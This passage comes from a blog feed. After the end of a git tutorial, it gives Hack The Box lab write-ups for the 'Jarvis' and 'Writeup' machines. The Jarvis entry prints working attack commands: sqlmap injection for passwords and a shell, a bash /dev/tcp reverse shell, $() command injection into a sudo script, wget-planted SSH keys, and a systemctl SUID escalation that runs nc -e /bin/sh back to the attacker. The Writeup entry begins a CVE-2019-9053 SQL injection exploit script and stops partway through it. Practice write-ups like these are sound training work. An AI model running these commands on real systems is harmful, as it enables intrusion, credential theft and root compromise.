&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git remote rm &amp;lt;alias&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Push branch to remote repository. The -u switch enables git to keep tracking the files which is what you want usually.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git push -u &amp;lt;alias&amp;gt; &amp;lt;branch&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Show local&#x2F;remote branches&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git branch -a
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Use this command when you forgot to use &lt;code&gt;git push -u&lt;&#x2F;code&gt; to track a branch. This modifies the .git&#x2F;config file&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git branch --set-upstream &amp;lt;non tracking&amp;gt; &amp;lt;alias(origin)&#x2F;non tracking&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;No need to add tracking branch name for this command if you initially used &lt;code&gt;git push -u&lt;&#x2F;code&gt; to track the branch&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git push
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;This fetches the latest changes from remote repository and updates the local origin&#x2F;master copy on your machine. Important reminder is that your origin&#x2F;master does not reflect the changes of master. Git manages origin&#x2F;master.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git fetch
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Guidelines for fetching:&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Fetch before you work&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Fetch before you push&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Fetch often&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;git pull&lt;&#x2F;code&gt; = &lt;code&gt;git fetch&lt;&#x2F;code&gt; + &lt;code&gt;git merge&lt;&#x2F;code&gt; - Convenient command but you should remember that &lt;code&gt;git pull&lt;&#x2F;code&gt; is a cominbation of these two commands. This way you know how to troubleshoot what is wrong in the fetch and merge process.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Checkout and track non-tracking branch from origin then switch to that branch&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git checkout -b &amp;lt;non tracking branch&amp;gt; &amp;lt;origin&#x2F;non tracking branch&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Pushing to an updated remote branch:&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Fetch first&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Merge changes&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Push changes&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Delete branch from remote repository&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git push origin --delete &amp;lt;remote branch&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;youtu.be&#x2F;bRuHFZkaifM&quot;&gt;Collaboration video example&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;tutorial-git&#x2F;lynda-git-collaboration1.png&quot; alt=&quot;lynda-git-collaboration1&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;tutorial-git&#x2F;lynda-git-collaboration2.png&quot; alt=&quot;lynda-git-collaboration2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;tutorial-git&#x2F;lynda-git-collaboration3.png&quot; alt=&quot;lynda-git-collaboration3&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Jarvis</title>
        <published>2019-11-09T00:00:00+00:00</published>
        <updated>2019-11-09T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/htb-jarvis/" type="text/html"/>
        <id>https://johntuyen.com/posts/htb-jarvis/</id>
        
        <content type="html">&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Port 80 and 64999. Port 80 hosts a bootstrap website. Port 64999 shows I&#x27;ve been banned for 90 seconds page. I don&#x27;t think that part of true as my scans were still running but we&#x27;ll note this down for now.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;nikto&lt;&#x2F;code&gt; scans shows that there is a phpmyadmin being hosted on port 80 and the version can be found at: &lt;a href=&quot;http:&#x2F;&#x2F;jarvis&#x2F;phpmyadmin&#x2F;ChangeLog&quot;&gt;http:&#x2F;&#x2F;jarvis&#x2F;phpmyadmin&#x2F;ChangeLog&lt;&#x2F;a&gt; - version 4.8.0 (2018 04 07)&lt;&#x2F;p&gt;
&lt;p&gt;After reading couple of exploits for phpmyadmin 4.8.0, I decided to try to use Metasploit module and see if it will work. Unfortunately it didn&#x27;t.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-jarvis&#x2F;htb-jarvis-msfconsole.png&quot; alt=&quot;htb-jarvis-msfconsole.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Being stuck on this problem for couple of hours, all my scans show up without much useful information to work with. The only thing left I could think about are SQL injections which I did had a hunch about from reading the past phpmyadmin exploits.&lt;&#x2F;p&gt;
&lt;p&gt;But where do we begin to perform SQL injections? Browsing the Jarvis website, there is a page that shows a list of room suites and the URL generates a &lt;code&gt;cod=5&lt;&#x2F;code&gt; parameter. I&#x27;m going to test to see if it&#x27;s vulnerable to SQL injection.&lt;&#x2F;p&gt;
&lt;p&gt;Using &lt;code&gt;burpsuite&lt;&#x2F;code&gt;, I saved a GET request to a file so I can use &lt;code&gt;sqlmap&lt;&#x2F;code&gt; to read it.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;sqlmap -r singlereq -p cod --passwords
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-jarvis&#x2F;htb-jarvis-sqlmap.png&quot; alt=&quot;htb-jarvis-sqlmap.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Looks like I got a hit for the phpmyadmin login and password. I&#x27;ll keep this aside and see if I could get a shell that we can upload files with.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;sqlmap -r singlereq -p cod --os-shell
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;An os-shell is accessible and we&#x27;re able to upload and execute a PHP reverse shell file for a &lt;code&gt;www-data&lt;&#x2F;code&gt; user shell.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Running the &lt;code&gt;linenum&lt;&#x2F;code&gt; and &lt;code&gt;linuxprivchecker&lt;&#x2F;code&gt; scripts showed there is a sudoers access to a python file at &lt;code&gt;&#x2F;var&#x2F;www&#x2F;Admin-Utilities&#x2F;simpler.py&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;After reviewing the python script, there is a ping function that blacklists certain characters. Doing some online research shows there is a way to execute commands with $, (, and ) characters.&lt;&#x2F;p&gt;
&lt;p&gt;Before we do that, lets create a reverse shell script for execution.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;echo &amp;quot;bash -i &amp;gt;&amp;amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.9&#x2F;8080 0&amp;gt;&amp;amp;1&amp;quot; &amp;gt; &#x2F;var&#x2F;tmp&#x2F;rs.sh
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Execute the simpler.py script:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;sudo -u pepper &#x2F;var&#x2F;www&#x2F;Admin-Utilities&#x2F;simpler.py -p
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;When the prompt shows up asking for an IP, enter this command:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;$(bash &#x2F;tmp&#x2F;rs.sh)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-jarvis&#x2F;htb-jarvis-simpler.png&quot; alt=&quot;htb-jarvis-simpler.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;A reverse shell with &lt;code&gt;pepper&lt;&#x2F;code&gt; user access has now been established and able to obtain the user.txt flag.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h3 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;&#x2F;h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Reading through my &lt;code&gt;linenum&lt;&#x2F;code&gt; and &lt;code&gt;linuxprivchecker&lt;&#x2F;code&gt; scripts, I noticed that the &lt;code&gt;systemctl&lt;&#x2F;code&gt; binary has an SUID flag set.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;-rwsr-x--- 1 root pepper 174520 Feb 17 03:22 &#x2F;bin&#x2F;systemctl
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;According to &lt;a href=&quot;https:&#x2F;&#x2F;gtfobins.github.io&#x2F;gtfobins&#x2F;systemctl&#x2F;&quot;&gt;GTFOBins&lt;&#x2F;a&gt;, SUID set can lead to privilege escalation. It wasn&#x27;t as easy as I thought.&lt;&#x2F;p&gt;
&lt;p&gt;I tried following the instructions and it will throw shell related errors such as:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;The name org.freedesktop.PolicyKit1 was not provided by any .service files
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;I haven&#x27;t seen these type of errors before and googling didn&#x27;t help. Asking for HTB users for a hint, I would have never thought of escalating my shell to something more stable. At first when I thought about this hint, I thought it meant that I should reverse shell again somewhere. Then I remembered that SSH was enabled on this box but how would I log in if I don&#x27;t have the password for &lt;code&gt;pepper&lt;&#x2F;code&gt; user and can&#x27;t execute &lt;code&gt;passwd&lt;&#x2F;code&gt; to change it? A light bulb went off and I figured since I am &lt;code&gt;pepper&lt;&#x2F;code&gt; technically, I can create ssh &lt;code&gt;authorized_keys&lt;&#x2F;code&gt; into the &lt;code&gt;pepper&lt;&#x2F;code&gt; home directory with my own public key and ssh using my private key.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;mkdir .ssh
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;wget http:&#x2F;&#x2F;10.10.14.9&#x2F;id_rsa.pub ~&#x2F;.ssh&#x2F;authorized_keys
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Then we SSH using my private key for access:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;ssh -i ~&#x2F;.ssh&#x2F;id_rsa pepper@jarvis
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Now we can begin with following GTFOBins &lt;code&gt;systemctl&lt;&#x2F;code&gt; instructions and it should now work.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Create the service file using &lt;code&gt;systemctl&lt;&#x2F;code&gt; with modified ExecStart value using &lt;code&gt;nc&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;TF=privesc.service
&lt;&#x2F;span&gt;&lt;span&gt;echo &amp;#39;[Service]
&lt;&#x2F;span&gt;&lt;span&gt;Type=oneshot
&lt;&#x2F;span&gt;&lt;span&gt;ExecStart=&#x2F;bin&#x2F;sh -c &amp;quot;&#x2F;bin&#x2F;nc -e &#x2F;bin&#x2F;sh 10.10.14.9 4444&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;[Install]
&lt;&#x2F;span&gt;&lt;span&gt;WantedBy=multi-user.target&amp;#39; &amp;gt; $TF
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Create a symbolic link using &lt;code&gt;systemctl&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;&#x2F;bin&#x2F;systemctl link &#x2F;home&#x2F;pepper&#x2F;privesc.service
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Setup a &lt;code&gt;nc&lt;&#x2F;code&gt; session to receive the root reverse shell:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;nc -nvlp 4444
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Enable the newly created service using &lt;code&gt;systemctl&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;&#x2F;bin&#x2F;systemctl enable --now &#x2F;home&#x2F;pepper&#x2F;privesc.service
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-jarvis&#x2F;htb-jarvis-systemctl.png&quot; alt=&quot;htb-jarvis-systemctl.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-jarvis&#x2F;htb-jarvis-rooted.png&quot; alt=&quot;htb-jarvis-rooted.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;code&gt;Protip&lt;&#x2F;code&gt;{: .info }&lt;&#x2F;p&gt;
&lt;p&gt;Always try to execute binaries as absolute paths and in different directories. Sometimes you&#x27;ll get cases where files don&#x27;t get executed where you saved the files.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Writeup</title>
        <published>2019-10-12T00:00:00+00:00</published>
        <updated>2019-10-12T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/htb-writeup/" type="text/html"/>
        <id>https://johntuyen.com/posts/htb-writeup/</id>
        
        <content type="html">&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Ports show 22 and 80 being opened. Port 80 hosts this weird page with ascii art on the home page. Scanning using dirbuster or dirsearch is useless as it bans my IP.  Although my nmap scan managed to find a &lt;code&gt;robot.txt&lt;&#x2F;code&gt; file that contains a disallowed entry for &lt;code&gt;&#x2F;writeup&#x2F;&lt;&#x2F;code&gt; directory.&lt;&#x2F;p&gt;
&lt;p&gt;Visiting the page doesn&#x27;t yield much information besides previous write ups of other HTB boxes. Looking through the source code revealed more information, the web page being hosted is using a platform called CMS Made Simple.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;meta &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Generator&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;content&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;CMS Made Simple - Copyright (C) 2004-2019. All rights reserved.&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Seeing that the copyright is 2019, I think the CMS version is very new.&lt;&#x2F;p&gt;
&lt;p&gt;Further investigation also shows a login link. Since I don&#x27;t know what password is, I&#x27;ll keep this aside just in case I need it.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;http:&#x2F;&#x2F;10.10.10.138&#x2F;writeup&#x2F;admin&#x2F;login.php
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;With all the information that I&#x27;ve found so far, it was time to Google what exploits I can utilize to get my way into user land. I found this &lt;a href=&quot;https:&#x2F;&#x2F;packetstormsecurity.com&#x2F;files&#x2F;152356&#x2F;cmsmadesimple22-sql.txt&quot;&gt;script&lt;&#x2F;a&gt;. It&#x27;s a SQL injection script targeting the CMS platform.&lt;&#x2F;p&gt;
&lt;p&gt;I had trouble running with this script as it couldn&#x27;t find the URL to exploit. After manually troubleshooting this script, I found the proper URL:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;http:&#x2F;&#x2F;10.10.10.138&#x2F;writeup&#x2F;moduleinterface.php?mact=News,m1_,default,0
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-writeup&#x2F;htb-writeup-moduleinterface.png&quot; alt=&quot;htb-writeup-moduleinterface&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#!&#x2F;usr&#x2F;bin&#x2F;env python
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# Exploit Title: Unauthenticated SQL Injection on CMS Made Simple &amp;lt;= 2.2.9
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# Date: 30-03-2019
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# Exploit Author: Daniele Scanu @ Certimeter Group
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# Vendor Homepage: https:&#x2F;&#x2F;www.cmsmadesimple.org&#x2F;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# Software Link: https:&#x2F;&#x2F;www.cmsmadesimple.org&#x2F;downloads&#x2F;cmsms&#x2F;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# Version: &amp;lt;= 2.2.9
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# Tested on: Ubuntu 18.04 LTS
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# CVE : CVE-2019-9053
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;requests
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;termcolor &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;colored
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;time
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;termcolor &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;cprint
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;optparse
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;hashlib
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;parser = optparse.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;OptionParser&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;parser.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;add_option&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;-u&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;--url&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;action&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;store&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;dest&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;url&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;help&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Base target uri (ex. http:&#x2F;&#x2F;10.10.10.138&#x2F;writeup)&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;parser.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;add_option&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;-w&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;--wordlist&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;action&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;store&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;dest&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;wordlist&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;help&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Wordlist for crack admin password&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;)
